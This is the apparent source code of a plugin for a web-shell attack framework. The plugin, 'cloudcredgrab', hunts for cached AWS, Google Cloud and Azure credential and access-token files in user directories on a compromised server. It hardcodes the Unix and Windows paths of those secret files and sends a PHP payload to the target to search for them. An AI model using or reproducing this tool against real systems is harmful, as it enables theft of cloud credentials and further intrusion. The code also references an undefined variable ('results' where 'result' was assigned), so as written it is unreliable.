"""Cloud Credential Hunter-Grabber

SYNOPSIS:
    cloudcredgrab [-u <USER>] [aws|google|azure]

DESCRIPTION:
    Hunts for cloud credentials cached on the system
    by looking in user's directory

EXAMPLES:
    > cloudcredgrab
      - look for all cloud credentials in all user directories
    > cloudcredgrab -u www aws
      - look for AWS credentials in www's user files

AUTHOR:
    Jose <https://twitter.com/jnazario>
"""

import itertools

from api import plugin
from api import server
from api import environ

from ui.color import colorize
import plugin_args

opt = plugin_args.parse(plugin.argv[1:])

UNIX_FILES = {'aws': ['.aws/credentials', ],
              'google': ['.config/gcloud/legacy_credentials',
                         '.config/gcloud/credentials.db',
                         '.config/gcloud/access_tokens.db'],
              'azure': ['.azure/accessTokens.json',
                        '.azure/azureProfile.json']}
WINDOWS_FILES = {'aws': [".aws\\credentials",],
                 'google': ["\\AppData\\Roaming\\gcloud\\legacy_credentials",
                            "\\AppData\\Roaming\\gcloud\\credentials.db",
                            "\\AppData\\Roaming\\gcloud\\access_tokens.db"],
                 'azure': [".azure\\accessTokens.json", ".azure\\azureProfile.json"]}

if environ['PLATFORM'].startswith("win"):
    FILES = WINDOWS_FILES
else:
    FILES = UNIX_FILES

if opt["platform"]:
    SEARCH_FOR = FILES[opt["platform"]]
else:
    SEARCH_FOR = list(itertools.chain.from_iterable(FILES.values()))

# Send payload
payload = server.payload.Payload("payload.php")
payload['USER'] = opt['user'] or "all"
payload['SEARCH_FOR'] = SEARCH_FOR

result = payload.send()

if len(results) < 1:
    print(colorize("%Red", "[-] No results found"))
else:
    for filename in results:
        print(colorize("%Green", "[+] Found {0}".format(filename)))
